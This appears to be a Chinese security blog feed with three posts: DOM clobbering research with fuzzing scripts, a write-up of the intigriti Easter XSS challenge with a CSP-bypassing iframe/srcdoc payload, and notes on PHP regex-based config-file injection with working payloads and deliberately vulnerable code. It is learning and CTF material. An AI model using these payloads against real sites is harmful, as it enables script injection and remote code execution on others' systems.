<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">test1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test1</span> <span class="attr">name</span>=<span class="string">test2</span> <span class="attr">href</span>=<span class="string">"alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test3</span> <span class="attr">name</span>=<span class="string">test4</span> <span class="attr">href</span>=<span class="string">"alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="handlebars"><span class="xml">console.log(test1.test2) //<span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test1</span> <span class="attr">name</span>=<span class="string">test2</span> <span class="attr">href</span>=<span class="string">"alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">console.log(test3.test4) //<span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test3</span> <span class="attr">name</span>=<span class="string">test4</span> <span class="attr">href</span>=<span class="string">"alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="Fuzz-Html-Tags"><a href="#Fuzz-Html-Tags" class="headerlink" title="Fuzz Html Tags"></a>Fuzz Html Tags</h6><p>在不构建HTMLCollection情况下，可以通过直接fuzz标签的关系，来确定是否可层级访问</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> log=[];</span><br><span class="line"><span class="keyword">var</span> html = [<span class="string">"a"</span>,<span class="string">"abbr"</span>,<span class="string">"acronym"</span>,<span class="string">"address"</span>,<span class="string">"applet"</span>,<span class="string">"area"</span>,<span class="string">"article"</span>,<span class="string">"aside"</span>,<span class="string">"audio"</span>,<span class="string">"b"</span>,<span class="string">"base"</span>,<span class="string">"basefont"</span>,<span class="string">"bdi"</span>,<span class="string">"bdo"</span>,<span class="string">"bgsound"</span>,<span class="string">"big"</span>,<span class="string">"blink"</span>,<span class="string">"blockquote"</span>,<span class="string">"body"</span>,<span class="string">"br"</span>,<span class="string">"button"</span>,<span class="string">"canvas"</span>,<span class="string">"caption"</span>,<span class="string">"center"</span>,<span class="string">"cite"</span>,<span class="string">"code"</span>,<span class="string">"col"</span>,<span class="string">"colgroup"</span>,<span class="string">"command"</span>,<span class="string">"content"</span>,<span class="string">"data"</span>,<span class="string">"datalist"</span>,<span class="string">"dd"</span>,<span class="string">"del"</span>,<span class="string">"details"</span>,<span class="string">"dfn"</span>,<span class="string">"dialog"</span>,<span class="string">"dir"</span>,<span class="string">"div"</span>,<span class="string">"dl"</span>,<span class="string">"dt"</span>,<span class="string">"element"</span>,<span class="string">"em"</span>,<span class="string">"embed"</span>,<span class="string">"fieldset"</span>,<span class="string">"figcaption"</span>,<span class="string">"figure"</span>,<span class="string">"font"</span>,<span class="string">"footer"</span>,<span class="string">"form"</span>,<span class="string">"frame"</span>,<span class="string">"frameset"</span>,<span class="string">"h1"</span>,<span class="string">"head"</span>,<span class="string">"header"</span>,<span class="string">"hgroup"</span>,<span class="string">"hr"</span>,<span class="string">"html"</span>,<span class="string">"i"</span>,<span class="string">"iframe"</span>,<span class="string">"image"</span>,<span class="string">"img"</span>,<span class="string">"input"</span>,<span class="string">"ins"</span>,<span class="string">"isindex"</span>,<span class="string">"kbd"</span>,<span class="string">"keygen"</span>,<span class="string">"label"</span>,<span class="string">"legend"</span>,<span class="string">"li"</span>,<span class="string">"link"</span>,<span class="string">"listing"</span>,<span class="string">"main"</span>,<span class="string">"map"</span>,<span class="string">"mark"</span>,<span class="string">"marquee"</span>,<span class="string">"menu"</span>,<span class="string">"menuitem"</span>,<span class="string">"meta"</span>,<span class="string">"meter"</span>,<span class="string">"multicol"</span>,<span class="string">"nav"</span>,<span class="string">"nextid"</span>,<span class="string">"nobr"</span>,<span class="string">"noembed"</span>,<span class="string">"noframes"</span>,<span class="string">"noscript"</span>,<span class="string">"object"</span>,<span class="string">"ol"</span>,<span class="string">"optgroup"</span>,<span class="string">"option"</span>,<span class="string">"output"</span>,<span class="string">"p"</span>,<span class="string">"param"</span>,<span class="string">"picture"</span>,<span class="string">"plaintext"</span>,<span class="string">"pre"</span>,<span class="string">"progress"</span>,<span class="string">"q"</span>,<span class="string">"rb"</span>,<span class="string">"rp"</span>,<span class="string">"rt"</span>,<span class="string">"rtc"</span>,<span class="string">"ruby"</span>,<span class="string">"s"</span>,<span class="string">"samp"</span>,<span class="string">"script"</span>,<span class="string">"section"</span>,<span class="string">"select"</span>,<span class="string">"shadow"</span>,<span class="string">"slot"</span>,<span class="string">"small"</span>,<span class="string">"source"</span>,<span class="string">"spacer"</span>,<span class="string">"span"</span>,<span class="string">"strike"</span>,<span class="string">"strong"</span>,<span class="string">"style"</span>,<span class="string">"sub"</span>,<span class="string">"summary"</span>,<span class="string">"sup"</span>,<span class="string">"svg"</span>,<span class="string">"table"</span>,<span class="string">"tbody"</span>,<span class="string">"td"</span>,<span class="string">"template"</span>,<span class="string">"textarea"</span>,<span class="string">"tfoot"</span>,<span class="string">"th"</span>,<span class="string">"thead"</span>,<span class="string">"time"</span>,<span class="string">"title"</span>,<span class="string">"tr"</span>,<span class="string">"track"</span>,<span class="string">"tt"</span>,<span class="string">"u"</span>,<span class="string">"ul"</span>,<span class="string">"var"</span>,<span class="string">"video"</span>,<span class="string">"wbr"</span>,<span class="string">"xmp"</span>], logs = [];</span><br><span class="line">div=<span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;html.length;i++) &#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>;j&lt;html.length;j++) &#123;</span><br><span class="line">    div.innerHTML=<span class="string">'&lt;'</span>+html[i]+<span class="string">' id=element1&gt;'</span>+<span class="string">'&lt;'</span>+html[j]+<span class="string">' id=element2&gt;'</span>;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(div);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">window</span>.element1 &amp;&amp; element1.element2)&#123;</span><br><span class="line">       log.push(html[i]+<span class="string">','</span>+html[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">document</span>.body.removeChild(div);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(log.join(<span class="string">'\n'</span>));</span><br></pre></td></tr></table></figure>

<p>可得到如下关系</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">form,button</span><br><span class="line">form,fieldset</span><br><span class="line">form,image</span><br><span class="line">form,img</span><br><span class="line">form,input</span><br><span class="line">form,object</span><br><span class="line">form,output</span><br><span class="line">form,select</span><br><span class="line">form,textarea</span><br></pre></td></tr></table></figure>

<p>测试代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">test1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">test2</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="handlebars"><span class="xml">console.log(test1.test2) //<span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">test2</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>不过这种是无法触发字符串的访问的，相对上种方法更局限一些</p>
<h5 id="三层访问"><a href="#三层访问" class="headerlink" title="三层访问"></a>三层访问</h5><p>对于三层的访问来讲，其实就是两种两层访问方法的叠加</p>
<p>测试代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">test1</span> <span class="attr">name</span>=<span class="string">test2</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">test3</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">test1</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(test1.test2.test3) <span class="comment">//&lt;button id=test3&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到返回结果为上面声明的id为test3的button标签</p>
<h5 id="三层以上访问"><a href="#三层以上访问" class="headerlink" title="三层以上访问"></a>三层以上访问</h5><p>三层以上的访问可以通过iframe与srcdoc来实现</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">a</span> <span class="attr">srcdoc</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;iframe srcdoc='&lt;a id=c name=d href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=c&gt;' name=b&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>alert(a.b.c.d),<span class="number">500</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果不想通过setTimeout进行延时的话，还可以通过<code>&lt;style&gt;</code>标签或者<code>&lt;script&gt;</code>等进行网络请求造成延时，使得iframe加载完毕</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">a</span> <span class="attr">srcdoc</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">    &lt;iframe srcdoc='&lt;a id=c name=d href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=c&gt;' name=b&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"//test.net"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">    alert(a.b.c.d)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="任意属性测试"><a href="#任意属性测试" class="headerlink" title="任意属性测试"></a>任意属性测试</h4><p>上面的测试一直是针对id与name进行测试的，但是dom中还有其他很多属性，下面是对于String类型并且可读可写的属性进行fuzz：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> html = [...]<span class="comment">//HTML elements array</span></span><br><span class="line"><span class="keyword">var</span> props=[];</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;html.length;i++)&#123;</span><br><span class="line">obj = <span class="built_in">document</span>.createElement(html[i]);</span><br><span class="line"><span class="keyword">for</span>(prop <span class="keyword">in</span> obj) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span> obj[prop] === <span class="string">'string'</span>) &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">DOM.innerHTML = <span class="string">'&lt;'</span>+html[i]+<span class="string">' id=x '</span>+prop+<span class="string">'=1&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">document</span>.getElementById(<span class="string">'x'</span>)[prop] == <span class="number">1</span>) &#123;</span><br><span class="line">props.push(html[i]+<span class="string">':'</span>+prop);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log([...new <span class="built_in">Set</span>(props)].join(<span class="string">'\n'</span>));</span><br></pre></td></tr></table></figure>

<p>可以得到两个有趣的可利用属性 为username和password,但是这两个并非HTML属性，利用如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">href</span>=<span class="string">"http://Clobbered-username:Clobbered-Password@a"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">href</span>=<span class="string">"ftp://Clobbered-username:Clobbered-Password@a"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(x.username)<span class="comment">//Clobbered-username</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(x.password)<span class="comment">//Clobbered-password</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>[<a href="http://wonderkun.cc/2020/02/15/DOM%20Clobbering%20Attack%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/]" target="_blank" rel="noopener">http://wonderkun.cc/2020/02/15/DOM%20Clobbering%20Attack%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/]</a>(<a href="http://wonderkun.cc/2020/02/15/DOM" target="_blank" rel="noopener">http://wonderkun.cc/2020/02/15/DOM</a> Clobbering Attack学习记录/)</p>
<p><a href="https://portswigger.net/research/dom-clobbering-strikes-back" target="_blank" rel="noopener">https://portswigger.net/research/dom-clobbering-strikes-back</a></p>
<p><a href="https://xz.aliyun.com/t/7329" target="_blank" rel="noopener">https://xz.aliyun.com/t/7329</a></p>
]]></content>
      <tags>
        <tag>DOM Clobbering Attack</tag>
      </tags>
  </entry>
  <entry>
    <title>intigriti Easter XSS challenge</title>
    <url>/2020/05/12/intigriti-Easter-XSS-challenge/</url>
    <content><![CDATA[<p>文章首发于先知</p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>国外的一个xss challenge(规定时间内做出可得一年的Burp Suite正版证书)</p>
<a id="more"></a>

<p><img src="https://s1.ax1x.com/2020/04/22/JY7U10.png" alt="JY7U10.png"></p>
<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>主要的功能逻辑代码为script.js, 如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> hash = <span class="built_in">document</span>.location.hash.substr(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(hash)&#123;</span><br><span class="line">  displayReason(hash);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"reasons"</span>).onchange = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(e.target.value != <span class="string">""</span>)</span><br><span class="line">    displayReason(e.target.value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reasonLoaded</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> reason = <span class="built_in">document</span>.getElementById(<span class="string">"reason"</span>);</span><br><span class="line">    reason.innerHTML = <span class="built_in">unescape</span>(<span class="keyword">this</span>.responseText);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">displayReason</span>(<span class="params">reason</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">window</span>.location.hash = reason;</span><br><span class="line">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  xhr.addEventListener(<span class="string">"load"</span>, reasonLoaded);</span><br><span class="line">  xhr.open(<span class="string">"GET"</span>,<span class="string">`./reasons/<span class="subst">$&#123;reason&#125;</span>.txt`</span>);</span><br><span class="line">  xhr.send();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码逻辑为：</p>
<p>通过触发location.hash的变化来调用displayReason函数，通过ajax请求得到./reasons/${reason}.txt，然后把response的内容返回给id为reason的标签。</p>
<p>首先测试了下直接在URL的锚部分写上xss语句</p>
<p><img src="https://s1.ax1x.com/2020/04/22/JtR4Zn.png" alt="JtR4Zn.png"></p>
<p>这里可以看到这个404的页面，在response时不仅对特殊字符进行了编码处理，而且还会将%替换为_，所以直接通过xss语句触发是没戏了。</p>
<p>接下来尝试了一下.htaccess等403页面的触发，看下对应的response内容有没有经过处理</p>
<p><img src="https://s1.ax1x.com/2020/04/22/JtfOER.png" alt="JtfOER.png"></p>
<p>可以看到，在403的response中我们的xss语句是完整存在的，那么接下来只需要把这个xss带到我们之前的页面就可以触发xss了</p>
<p>进行尝试</p>
<p>这里需要注意两个地方</p>
<ul>
<li>第一个是默认ajax去请求是下reasons文件夹下，我们如果要请求.htaccess是需要向上跳一级目录的</li>
<li>第二个是我们需要拿到的是访问htaccess得到的response，所以htaccess的参数需要进行二次编码</li>
</ul>
<p>最终访问效果如下：</p>
<p><img src="https://s1.ax1x.com/2020/04/22/JtIBZQ.png" alt="JtIBZQ.png"></p>
<p>可以看到img标签成功被解析。</p>
<p>不过此时仍然没法弹窗，因为这个challenge是有csp进行限制的,csp规则如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">default-src &#39;self&#39;;</span><br></pre></td></tr></table></figure>

<p>限制了资源必须来自此站点</p>
<p>那么接下来就开始寻找一些可以当成js来执行的地方，我们可以通过之前的404页面返回的内容来当作我们的js语句，并且通过script标签的src属性进行引入，唯一需要注意的是要进行单引号的闭合</p>
<p>构造语句如下：</p>
<p><a href="https://imgchr.com/i/JtbPAg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/04/22/JtbPAg.png" alt="JtbPAg.png"></a></p>
<p>在控制台执行一下</p>
<p><img src="https://s1.ax1x.com/2020/04/22/JtbQN4.png" alt="JtbQN4.png"></p>
<p>成功触发，接下来把这个返回内容作为外部js引入就可以了</p>
<p>不过不能直接在response里面直接返回script标签，因为这里的赋值是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reason.innerHTML &#x3D; unescape(this.responseText);</span><br></pre></td></tr></table></figure>

<p>通过innterHTML产生的script标签并不可以执行</p>
<p>所以这里可以用iframe的srcdoc属性去解决这个问题，payload如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span>/<span class="attr">srcdoc</span>=<span class="string">'&lt;script src="x%27-alert(document.domain)-%27"&gt;&lt;/script&gt;'</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>将上面的payload二次编码后，放进location.hash</p>
<p>成功触发xss</p>
<p><img src="https://s1.ax1x.com/2020/04/22/JtvIGF.png" alt="JtvIGF.png"></p>
]]></content>
      <tags>
        <tag>intigriti Easter</tag>
      </tags>
  </entry>
  <entry>
    <title>正则与经典写配置漏洞学习</title>
    <url>/2020/03/24/%E6%AD%A3%E5%88%99%E4%B8%8E%E7%BB%8F%E5%85%B8%E5%86%99%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>看到P牛的小密圈发了这篇文章 感觉很棒 所以来学习一下.</p>
<a id="more"></a>

<h3 id="前置知识铺垫"><a href="#前置知识铺垫" class="headerlink" title="前置知识铺垫"></a>前置知识铺垫</h3><h4 id="single-line和multi-line"><a href="#single-line和multi-line" class="headerlink" title="single-line和multi-line"></a>single-line和multi-line</h4><p>single-line与multi-line分别对应了/s和/m修饰符。</p>
<h5 id="multi-line"><a href="#multi-line" class="headerlink" title="multi-line"></a>multi-line</h5><p>multi-line表示按行来进行正则匹配：将待匹配的文本利用换行符分割，并对每一部分进行正则匹配，将每部分的结果用or进行运算，得出最终的结果。</p>
<p>举一个例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(preg_match(<span class="string">'/^a[a-z]+z$/m'</span>, <span class="string">"abbz\n123"</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回1</span></span><br></pre></td></tr></table></figure>

<h5 id="single-line"><a href="#single-line" class="headerlink" title="single-line"></a>single-line</h5><p>将待匹配文本视作单行，并且换行符不再作为换行的标志，. 可匹配换行符</p>
<h4 id="默认情况的正则-不加修饰符"><a href="#默认情况的正则-不加修饰符" class="headerlink" title="默认情况的正则(不加修饰符)"></a>默认情况的正则(不加修饰符)</h4><p>对于如下正则：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(preg_match(<span class="string">'/^a[a-z]+z$/'</span>, <span class="string">"abbz\nccz"</span>));</span><br><span class="line"></span><br><span class="line">返回<span class="number">0</span> 说明默认情况下非多行匹配</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(preg_match(<span class="string">'/^a.+z$/'</span>, <span class="string">"abbz\nccz"</span>));</span><br><span class="line"></span><br><span class="line">返回<span class="number">0</span> 说明无法匹配换行符</span><br></pre></td></tr></table></figure>

<p>所以在默认情况下代表着：single-line且.不会匹配换行符</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>引用一下p牛的总结</p>
<ul>
<li>不加s或m修饰符 -&gt; single line，但 . 不能匹配换行符</li>
<li>单独加s修饰符 -&gt; single line，且 . 匹配包括换行符在内的所有字符</li>
<li>单独加m修饰符 -&gt; multi line</li>
<li>同时加m和s两个修饰符 -&gt; multi line，且 . 匹配包括换行符在内的所有字符</li>
</ul>
<h3 id="配置漏洞与其变形"><a href="#配置漏洞与其变形" class="headerlink" title="配置漏洞与其变形"></a>配置漏洞与其变形</h3><h4 id="正则贪婪模式且无-s修饰符"><a href="#正则贪婪模式且无-s修饰符" class="headerlink" title="正则贪婪模式且无/s修饰符"></a>正则贪婪模式且无/s修饰符</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/\\\$API = '.*';/"</span>, <span class="string">"\$API = '&#123;$api&#125;';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<p>利用.*不会匹配换行的特性，利用换行绕过</p>
<p>第一次：api=a’;%0aphpinfo();//</p>
<p>第二次：api=aaa</p>
<h4 id="正则贪婪模式且有-s修饰符"><a href="#正则贪婪模式且有-s修饰符" class="headerlink" title="正则贪婪模式且有/s修饰符"></a>正则贪婪模式且有/s修饰符</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/\\\$API = '.*';/s"</span>, <span class="string">"\$API = '&#123;$api&#125;';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<p>由于/s修饰符 所以无法利用换行绕过，不过可以用$0或者\0来引入单引号进行闭合，$0在preg_replace函数中代表着完整的匹配模式或者匹配文本</p>
<p>第一次</p>
<p>api=;phpinfo();//</p>
<p>对应：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$API = <span class="string">';phpinfo();//'</span>;</span><br></pre></td></tr></table></figure>

<p>第二次</p>
<p>api=$0</p>
<p>对应</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$API = <span class="string">'$API = '</span>;phpinfo();<span class="comment">//';';</span></span><br></pre></td></tr></table></figure>

<p>成功在配置文件中写入任意内容</p>
<h4 id="正则非贪婪模式且无-s修饰符"><a href="#正则非贪婪模式且无-s修饰符" class="headerlink" title="正则非贪婪模式且无/s修饰符"></a>正则非贪婪模式且无/s修饰符</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/\\\$API = '.*?';/"</span>, <span class="string">"\$API = '&#123;$api&#125;';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>和之前唯一不同的是现在是非贪婪的匹配模式，也就意味着匹配到第一个单引号之后就不会接着往下继续匹配了</p>
<p>所以我们换行和不换行都可以绕过了</p>
<p>Payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一种</span><br><span class="line">aa&#39;;phpinfo();&#x2F;&#x2F;</span><br><span class="line">aa</span><br><span class="line">第二种</span><br><span class="line">aa&#39;;%0aphpinfo();&#x2F;&#x2F;</span><br><span class="line">aa</span><br></pre></td></tr></table></figure>

<h4 id="正则非贪婪模式且有-s修饰符"><a href="#正则非贪婪模式且有-s修饰符" class="headerlink" title="正则非贪婪模式且有/s修饰符"></a>正则非贪婪模式且有/s修饰符</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/\\\$API = '.*?';/s"</span>, <span class="string">"\$API = '&#123;$api&#125;';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<p>虽然加了/s修饰符，但是因为为非贪婪模式，上面的payload同样适用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一种</span><br><span class="line">aa&#39;;phpinfo();&#x2F;&#x2F;</span><br><span class="line">aa</span><br><span class="line">第二种</span><br><span class="line">aa&#39;;%0aphpinfo();&#x2F;&#x2F;</span><br><span class="line">aa</span><br></pre></td></tr></table></figure>

<h4 id="define情况下的贪婪且-s修饰"><a href="#define情况下的贪婪且-s修饰" class="headerlink" title="define情况下的贪婪且/s修饰"></a>define情况下的贪婪且/s修饰</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/define\('API', '.*'\);/"</span>, <span class="string">"define('API', '&#123;$api&#125;');"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<p>和第一种一样，只是换了下变量的定义方式，换行绕过即可</p>
<p>Payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一次</span><br><span class="line">api&#x3D;a&#39;);%0aphpinfo();&#x2F;&#x2F;</span><br><span class="line">第二次</span><br><span class="line">api&#x3D;a</span><br></pre></td></tr></table></figure>

